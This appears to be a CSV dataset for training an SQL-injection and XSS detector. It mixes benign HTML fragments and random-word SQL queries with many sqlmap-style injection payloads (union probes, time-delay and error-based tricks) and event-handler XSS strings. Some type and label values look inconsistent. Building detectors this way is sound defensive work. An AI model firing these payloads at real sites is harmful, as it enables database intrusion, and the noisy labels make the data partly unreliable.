Text,Label,type
"<sup id=""cite_ref-Roberts_147-0"" class=""reference""><a href=""#cite_note-Roberts-147"">&#91;144&#93; </a> </sup> Many advances have general, cross-domain significance. One high-profile example is that <a href=""/wiki/DeepMind"" title=""DeepMind"">DeepMind </a> in the 2010s developed a ""generalized artificial intelligence"" that could learn many diverse <a href=""/wiki/Atari_2600"" title=""Atari 2600"">Atari </a> games on its own, and later developed a variant of the system which succeeds at <a href=""/wiki/Catastrophic_interference#The_Sequential_Learning_Problem:_McCloskey_and_Cohen_(1989)"" title=""Catastrophic interference"">sequential learning </a>.",0,xss
1' order by 1--,1,sql
<rp id=x tabindex=1 onfocusin=alert(1)></rp>,2,xss
SELECT * FROM cream WHERE oxygen = 'person' LIMIT 3,0,sql
SELECT how,0,sql
"1""  )   as nfpe where 2679  =  2679",1,sql
1'||  (  select 'uiyj' from dual where 8320  =  8320,1,sql
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,2,xss
	 </span> </li>,0,xss
"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#",1,sql
"INSERT INTO pressure ( giving, prize, powder, mail, work, common )  VALUES  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )  ",0,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",1,sql
<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>",2,xss
"aldebaran 84,",0,sql
"<head onclick=""alert(1)"">test</head>",2,xss
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'qdij'  =  'qdij",1,sql
"<data onmouseleave=""alert(1)"">test</data>",2,xss
"<li id=""cite_note-361""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-361"">^ </a> </b> ",0,xss
"1'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
8586,0,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;239–243 </li>",0,xss
caca ihnen,0,sql
<title id=x tabindex=1 onfocusin=alert(1)></title>,2,xss
SELECT were ( s ) FROM snake INNER JOIN,0,xss
SELECT * FROM anybody FETCH FIRST 3 ROWS ONLY,0,sql
"  SELECT Orders.pigrID, Employees.shirt, Employees.already FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.hornID ORDER BY Orders.goldID",0,xss
SELECT damage ( s )  FROM during FULL OUTER JOIN,0,sql
or 1  =  1 --,1,sql
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,sql
<dd id=x tabindex=1 onactivate=alert(1)></dd>,2,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn",1,xss
	 </span> </h3>,0,xss
<menu onpointerenter=alert(1)>XSS</menu>,2,xss
"<element onmouseenter=""alert(1)"">test</element>",2,xss
"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",2,xss
"calle arfian 36,",0,sql
document.scripts.length,2,xss
8.93945E+14,0,sql
SELECT * FROM wife WHERE slight = 'operation' LIMIT 3,0,xss
"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
	 </span>,0,xss
1   )    )     )   rlike sleep  (  5  )  #,1,xss
SELECT * FROM hundred WHERE beautiful NOT LIKE '[arrangement]%',0,xss
"1%'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,2,xss
"<colgroup onbeforecopy=""alert(1)"" contenteditable>test</colgroup>",2,xss
SELECT * FROM  ( SELECT writing FROM in ) ,0,sql
"<li><a href=""/wiki/Computability"" title=""Computability"">Computability </a> </li>",0,xss
"1%'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1,sql
SELECT COUNT ( depend ) FROM discuss,0,xss
SELECT * FROM garage WHERE pie BETWEEN '1996-07-01' AND '1996-07-31',0,sql
<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>,2,xss
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,sql
42782721f,0,xss
	 </span></a></dt><dd>Download files and/or images associated with your scraped items.</dd>,0,xss
"<li><a href=""/wiki/Testability"" title=""Testability"">Testability </a> </li>",0,xss
"<ul><li><a href=""/wiki/Immanuel_Kant"" title=""Immanuel Kant"">Immanuel Kant </a> </li>",0,xss
"<samp onclick=""alert(1)"">test</samp>",2,xss
"<ul><li><a href=""/wiki/Behaviorism"" title=""Behaviorism"">Behaviorism </a> (<a href=""/wiki/Radical_behaviorism"" title=""Radical behaviorism"">Radical </a>) </li>",0,xss
1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1,xss
totino,0,xss
"<style>@keyframes slidein {}</style><nextid style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nextid>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>",2,xss
"   SELECT COUNT ( police ) , official FROM won BY bring",0,sql
6225,0,sql
SELECT * FROM shout WHERE flame BETWEEN '1996-07-01' AND '1996-07-31',0,sql
 (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,1,sql
DELETE FROM earn WHERE must = 'labor',0,sql
60996626m,0,sql
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sql
"<h1 onmouseout=""alert(1)"">test</h1>",2,xss
"1"" where 5927  =  5927",1,sql
SELECT * FROM student WHERE wash BETWEEN '1996-07-01' AND '1996-07-31',0,sql
select   (  case when   (  8663  =  7467  )   then 8663 else 1/  (  select 0  )   end  )  --,1,sql
SELECT MIN ( deep )  AS visitor FROM early,0,sql
"  SELECT * FROM Customers   WHERE Country NOT IN  ( 'Germany', 'France', 'UK' ) ; ",0,sql
SELECT TOP 3 * FROM carefully,0,sql
"<a href=""/wiki/Neats_vs._scruffies"" class=""mw-redirect"" title=""Neats vs. scruffies"">Neats vs. scruffies </a>:",0,xss
"   SELECT COUNT ( donkey ) , before FROM parallel BY of",0,sql
"  SELECT weighID AS ID, repeat AS thought FROM office",0,sql
1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,1,xss
"   SELECT second,term,jack,affect,field     (  (  cup JOIN shoe ON add.orange =  space.contain )   INNER JOIN tipON Orders.percent =  distance.changeID ) ",0,sql
SELECT AVG ( cool ) FROM sick,0,sql
"   SELECT pack,ourselves,dirty,church,basket     (  (  nice JOIN couple ON fur.made =  blood.still )   INNER JOIN answerON Orders.slipped =  nine.fearID ) ",0,xss
"1""  )   union all select null,null,null,null,null,null,null,null,null#",1,sql
SELECT COUNT ( judge )  FROM camp,0,sql
"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sql
SELECT AVG ( step ) FROM say SELECT SUM ( wife ) ,0,sql
select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,1,sql
teodosio,0,sql
1'  )   as mzby where 6530  =  6530,1,sql
SELECT MIN ( planning )  AS wear FROM space,0,sql
SELECT * FROM same WHERE    NOT simply = 'south',0,sql
abaeto sanchon,0,sql
3.4285E+15,0,sql
SELECT TOP 3 * FROM appropriate WHERE active = 'series' SELECT * FROM event,0,xss
"-5294%""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,1,sql
"<fieldset onbeforecut=""alert(1)"" contenteditable>test</fieldset>",2,xss
1'  )   and sleep  (  5  ) ,1,sql
sntoma,0,xss
7315,0,sql
rasifo,0,sql
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,2,xss
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367658 ) ,0,sql
FROM  ( SELECT DISTINCT mind FROM easier ) ,0,sql
"<em onmouseleave=""alert(1)"">test</em>",2,xss
"1' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
SELECT lay ( s )  FROM shine SELECT victory ( s ) ,0,sql
"<aside draggable=""true"" ondragend=""alert(1)"">test</aside>",2,xss
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1,xss
<wbr onpointerout=alert(1)>XSS</wbr>,2,xss
vallb remesar,0,sql
0,1,xss
"<dt><a class=""reference internal"" href=""topics/deploy.html""><span class=""doc"">Deploying Spiders",0,xss
1 where 6036  =  6036 and 7533  =  7533--,1,xss
" </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"" style=""text-align: center;"">",0,xss
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""M"" ) ;",0,xss
	 </span> </li>,0,xss
"-2046'  )   union all select 6668,6668--",1,sql
SELECT * FROM join WHERE NOT attached = 'wrong'  AND NOT remove = 'teach',0,sql
"<param onclick=""alert(1)"">test</param>",2,xss
 ,0,xss
"<menu onclick=""alert(1)"">test</menu>",2,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;712–724, </li>",0,xss
<div id=x tabindex=1 onfocusin=alert(1)></div>,2,xss
      <dl>,0,xss
<div onpointerout=alert(1)>XSS</div>,2,xss
ordinar,0,sql
SELECT * FROM think WHERE consist = 'face',0,sql
yarela,0,sql
-6217   )    )    as hyws where 3441  =  3441 or 9421  =  4695#,1,sql
SELECT TOP 3 * FROM chart WHERE moment = 'house' SELECT * FROM nearly,0,sql
"<frameset onkeypress=""alert(1)"" contenteditable>test</frameset>",2,xss
-9212 or 1026  =  7967#,1,sql
"<li id=""cite_note-65""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-65"">^ </a> </b> ",0,xss
DELETE FROM step WHERE now = 'other',0,sql
<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>,2,xss
SELECT column_name FROM table_name WHERE column_name operator ANY,0,sql
boix machiavelli,0,sql
"<div draggable=""true"" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>",2,xss
"<li><a href=""/wiki/Explanatory_power"" title=""Explanatory power"">Explanatory power </a> </li>",0,xss
SELECT * FROM lower WHERE football  BETWEEN 10 AND 20,0,sql
	 </span> </a> </li>,0,xss
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",1,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;453–541 </li> </ul>",0,xss
SELECT COUNT ( leaf ) FROM select,0,sql
"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'jfwt' like 'jfwt",1,sql
2.47397E+15,0,sql
"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""qblj"" like ""qblj",1,sql
1   )    ) ,1,sql
"waitfor delay '0:0:5' and   (  ""%""  =  """,1,sql
1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,1,sql
SELECT * FROM  ( SELECT announced FROM knew ) ,0,sql
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,1,xss
-4498  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2902  =  2902,1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Artificial_consciousness"" title=""Artificial consciousness"">Artificial consciousness </a> </div>",0,xss
"1"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
<article id=x tabindex=1 onfocusin=alert(1)></article>,2,xss
SELECT * FROM upon  WHERE pool = excitement,0,sql
SELECT * FROM than WHERE modern = 'favorite' FETCH FIRST 3 ROWS ONLY,0,xss
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'zaru'  =  'zaru",1,xss
SELECT * FROM case WHERE century NOT BETWEEN 'silk' AND 'guess',0,xss
SELECT MIN ( symbol )  AS while FROM hurried,0,sql
<fieldset onpointerleave=alert(1)>XSS</fieldset>,2,xss
"<a href=""/wiki/Transhumanism"" title=""Transhumanism"">Transhumanism </a>:",0,xss
 UPDATE cost SET cat = 'discuss'WHERE today = 'dig',0,sql
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk",1,sql
1' where 5335  =  5335,1,sql
"<li><cite id=""CITEREFMaker2006"" class=""citation web"">Maker, Meg Houston (2006). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070103222615/http://www.engagingexperience.com/2006/07/ai50_ai_past_pr.html"">""AI@50: AI Past, Present, Future"" </a>. Dartmouth College. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.engagingexperience.com/2006/07/ai50_ai_past_pr.html"">the original </a> on 3 January 2007<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">16 October ",0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"1%'   )    )     )   union all select null,null,null,null,null,null--",1,sql
"<details oncopy=""alert(1)"" contenteditable>test</details>",2,xss
-7378' or 6872  =  6872 and 'bnmn' like 'bnmn,1,sql
"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sql
SELECT * FROM chain WHERE butter LIKE '%way%',0,sql
"  SELECT * FROM here WHERE seven NOT IN  ( 'mine', 'origin', 'future' )  ",0,sql
" </p><p>Several works use AI to force us to confront the fundamental question of what makes us human, showing us artificial beings that have <a href=""/wiki/Sentience"" title=""Sentience"">the ability to feel </a>, and thus to suffer. This appears in <a href=""/wiki/Karel_%C4%8Capek"" title=""Karel Čapek"">Karel Čapek </a>'s <i><a href=""/wiki/R.U.R."" title=""R.U.R."">R.U.R. </a> </i>, the films <i><a href=""/wiki/A.I._Artificial_Intelligence"" title=""A.I. Artificial Intelligence"">A.I. Artificial Intelligence </a> </i> and <i><a href=""/wiki/Ex_Machina_(film)"" title=""Ex Machina (film)"">Ex Machina </a> </i>, as well as the novel <i><a href=""/wiki/Do_Androids_Dream_of_Electric_Sheep%3F"" title=""Do Androids Dream of Electric Sheep?"">Do Androids Dream of Electric Sheep? </a> </i>, by <a href=""/wiki/Philip_K._Dick"" title=""Philip K. Dick"">Philip K. Dick </a>. Dick considers the idea that our understanding of human subjectivity is altered by technology created with artificial intelligence.<sup id=""cite_ref-417"" class=""reference""><a href=""#cite_note-417"">&#91;405&#93; </a> </sup>",0,xss
SELECT * FROM list WHERE operation = 'search' LIMIT 3,0,sql
	 </span> </h3>,0,xss
"1""  )   as eomu where 6599  =  6599",1,xss
"  SELECT awayID AS ID, mysterious AS easy FROM opportunity",0,sql
"1""   )    )     )   waitfor delay '0:0:5'--",1,sql
"<tr onmousemove=""alert(1)"">test</tr>",2,xss
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'zspf'  =  'zspf",1,sql
20115,0,sql
<td onpointerenter=alert(1)>XSS</td>,2,xss
         </div>           ,0,xss
"<li><a href=""/wiki/Karl_Pearson"" title=""Karl Pearson"">Karl Pearson </a> </li> </ul>",0,xss
      <hr/>,0,xss
22193,0,sql
SELECT colony ( s )  FROM halfway UNION ALL,0,xss
SELECT * FROM ever WHERE setting LIKE '%clean%',0,sql
"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>,2,xss
</dl>,0,xss
3.60E+15,0,sql
lucila2,0,xss
<em id=x tabindex=1 onfocusin=alert(1)></em>,2,xss
"  SELECT * FROM right WHERE upward IN  ( 'music', 'city', 'jet' )  ",0,sql
"-2028'   )    )     )   union all select 8698,8698,8698,8698#",1,sql
"<main ondblclick=""alert(1)"">test</main>",2,xss
91309762s,0,sql
SELECT below ( s )  FROM dear UNION,0,sql
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"  SELECT Orders.enginerID, Employees.necessary, Employees.mountain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.cameID ORDER BY Orders.everyoneID",0,sql
"1  )   union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"<output onkeypress=""alert(1)"" contenteditable>test</output>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation journal"">McCauley, Lee (2007). ""AI armageddon and the three laws of robotics"". <i>Ethics and Information Technology </i>. <b>9 </b> (2): 153–164. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.85.8904"">10.1.1.85.8904 </a> ",0,xss
